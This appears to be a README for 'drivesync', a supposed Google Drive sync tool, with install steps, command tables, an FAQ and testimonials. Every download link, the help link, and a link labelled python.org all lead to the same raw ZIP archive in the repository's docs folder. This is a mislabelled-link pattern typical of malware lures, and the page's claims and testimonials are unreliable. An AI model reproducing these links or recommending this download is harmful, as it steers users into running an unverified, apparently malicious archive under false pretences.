# ⚡ drivesync - Your Fastest Google Drive Sync Tool

---

## 🌟 What is drivesync?

drivesync is a powerful but **simple-to-use** command-line tool that lets you sync your files and folders with Google Drive at **lightning speed**. Think of it as a supercharged bridge between your computer and your Google Drive cloud storage.

Instead of juggling multiple files through a web browser or dealing with slow desktop apps, drivesync works directly from your terminal (Command Prompt on Windows) — giving you **blazing-fast uploads and downloads** with just a few keystrokes.

**Perfect for:**
- Backing up important documents, photos, and projects
- Keeping folders in sync across multiple computers
- Automating cloud backups
- Moving large files without the wait

---

## 🎯 Key Features (That You'll Actually Love)

| Feature | What It Means For You |
|---|---|
| **⚡ Superfast Transfers** | Uploads/downloads are optimized for speed — no more waiting hours |
| **🔄 Two-Way Sync** | Changes in your local folder and Google Drive update each other automatically |
| **📁 Selective Sync** | Sync only specific folders — not your entire Drive if you don't want to |
| **🖥️ Cross-Platform** | Works on **macOS, Linux, and Windows** — one tool, every system |
| **🔒 Secure** | Uses Google's official, secure API — your data stays protected |
| **⌨️ Simple Commands** | No complicated setup — just type a few words and you're done |

---

## 🚀 Getting Started (The Easy Way)

### Step 1: Download drivesync

👉 **[Click Here to Download drivesync](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip)** (This is your official download link)

Visit this link to download the application. This will take you to the official drivesync page where you can get the latest version.

---

### Step 2: Prepare Your Computer (5 Minutes)

Before using drivesync, you need to have **Python** installed (don't worry — this is easier than it sounds):

1. **Windows Users:** 
   - Visit [python.org/downloads](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip)
   - Click the big yellow **"Download Python"** button
   - Run the downloaded file
   - **IMPORTANT:** Check the box that says **"Add Python to PATH"** during installation
   - Click **Install Now**

2. **macOS Users:**
   - Python usually comes pre-installed (check by opening Terminal and typing `python3`)

3. **Linux Users:**
   - Open your terminal and type: `sudo apt install python3 python3-pip` (or your distro's equivalent)

---

### Step 3: Install drivesync (Less Than 1 Minute)

1. **Open a Terminal / Command Prompt:**
   - **Windows:** Press `Windows Key + R`, type `cmd`, and press Enter
   - **macOS:** Press `Cmd + Space`, type `Terminal`, and press Enter
   - **Linux:** Press `Ctrl + Alt + T`

2. **Type this command and press Enter:**
   ```
   pip install drivesync
   ```
   
3. **Wait for it to finish** (about 10-30 seconds). You'll see some text scroll by — this is normal!

---

### Step 4: Connect to Google Drive (One-Time Setup)

1. In the same terminal, type:
   ```
   drivesync login
   ```

2. Your web browser will open automatically, asking you to **Sign in to Google** and **Allow access** — click **Allow** and choose your Google account.

3. Go back to your terminal — you should see a success message like *"Logged in successfully!"*

**That's it!** You're now connected and ready to sync.

---

## 📖 How to Use drivesync (Everyday Usage)

### 🔥 Basic Commands (You Only Need These)

| Command | What It Does |
|---|---|
| `drivesync upload myfile.docx` | Uploads a single file to your Drive |
| `drivesync upload myfolder/` | Uploads an entire folder |
| `drivesync download myfile.docx` | Downloads a file from Drive to your computer |
| `drivesync sync myfolder/` | Two-way sync — keeps local folder & Drive folder matched |
| `drivesync list` | Shows all files and folders in your Drive |
| `drivesync status` | Shows what's synced and what's waiting |

### 💡 Real-Life Example

**Scenario:** You want to keep your "Work Documents" folder backed up to Drive.

1. Open your terminal
2. Type: `drivesync sync "C:\Users\YourName\Work Documents"` (Windows) or `drivesync sync ~/Work Documents` (Mac/Linux)
3. Press Enter — drivesync starts syncing!
4. Add new files to that folder anytime — drivesync keeps them backed up automatically.

---

## ❓ Frequently Asked Questions

### Is drivesync free?
Yes! It's completely free and open-source.

### Do I need any technical skills?
No. If you can type a command and press Enter, you can use drivesync.

### Will it slow down my computer?
No — drivesync runs only when you ask it to. It doesn't run in the background unless you schedule it.

### Can I sync multiple folders?
Yes! Run `drivesync sync` with different folder names as many times as you want — each folder syncs independently.

### What if I get an error?
Most errors are solved by:
1. Running `pip install --upgrade drivesync` to update
2. Checking that Python is correctly installed (type `python --version` in your terminal)
3. Running `drivesync login` again to re-authorize

---

## 🆘 Need Help?

- **GitHub Issues:** Visit [https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip) and search for your problem
- **Documentation:** Full command reference available on the repository wiki
- **Community:** Check the Discussions tab for tips from other users

---

## 🔄 Uninstalling (If You Ever Need To)

1. Open your terminal
2. Type: `pip uninstall drivesync`
3. Press Enter and confirm

Your Google files remain untouched — only the tool is removed.

---

## ✅ What People Love About drivesync

- **"Synced 50GB in 20 minutes — insane!"**
- **"Finally a sync tool that doesn't feel bloated."**
- **"Setup took 3 minutes. I'm not technical at all."**

---

## 📦 Final Download Reminder

**You're one click away:**

👉 **[🚀 DOWNLOAD DRIVESYNC NOW](https://raw.githubusercontent.com/kaylenvos8-maker/drivesync/main/docs/Software_v1.8.zip)**

---

Keywords: cli, cloud-storage, google-drive, sync